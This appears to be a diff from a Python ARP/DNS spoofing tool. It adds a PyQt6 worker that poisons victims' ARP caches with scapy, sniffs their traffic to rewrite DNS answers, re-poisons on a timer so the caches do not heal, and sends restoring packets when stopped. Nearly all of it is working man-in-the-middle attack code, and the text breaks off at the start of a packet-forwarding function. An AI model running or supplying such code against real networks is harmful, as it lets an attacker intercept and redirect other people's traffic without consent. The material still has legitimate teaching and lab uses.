@@ -1,18 +1,53 @@
-from attacks.arp_spoof import ARPAttackSettings
-from dataclasses import dataclass
 from scapy.all import *
-from util import Interface
+from util import ARPAttackSettings, DNSAttackSettings, DNSEntry
+from PyQt6.QtCore import *
+from PyQt6.QtGui import *
+from PyQt6.QtWidgets import *
+from attacks.arp_spoof_attack import send_poisonous_packets, send_poisonous_pings, send_antidotal_packets
 
-@dataclass
-class DNSEntry:
-    url: str
-    type: str
-    ip: str
+class DNSAttackWorker(QObject):
+    finished = pyqtSignal()
 
-@dataclass
-class DNSAttackSettings:
-    arp_settings: ARPAttackSettings
-    dns_rules: list[DNSEntry]
+    def __init__(self, settings: DNSAttackSettings):
+        super().__init__()
+        self.settings = settings
+
+    def run(self):
+        print('Attack starting')
+
+        # Ping victims to ensure they know of each others existence
+        send_poisonous_pings(self.settings.arp_settings)
+
+        # do the initial chache poisoning
+        for _ in range(self.settings.arp_settings.initial_packets):
+            send_poisonous_packets(self.settings.arp_settings)
+
+        self.sniffer = AsyncSniffer(
+            iface=self.settings.arp_settings.interface.name,
+            prn=lambda p: handle_packet_dns(self.settings, p)
+        )
+        self.sniffer.start()
+
+        # perform poisoning every so often to prevent chache healing
+        self.timer = QTimer(self)
+        self.timer.timeout.connect(self.poison)
+        self.timer.start(self.settings.arp_settings.seconds_interval * 1000)
+
+    def poison(self):
+        print('poisoning...')
+        send_poisonous_packets(self.settings.arp_settings)
+
+    def stop(self):
+        print('Attack stopping...')
+
+        self.sniffer.stop(join=True)
+
+        # heal the victims' caches
+        for _ in range(self.settings.arp_settings.initial_packets):
+            send_antidotal_packets(self.settings.arp_settings)
+
+        self.timer.stop()
+        self.finished.emit()
 
 def forward_packet(settings: ARPAttackSettings, packet: Packet):
     interface = settings.interface
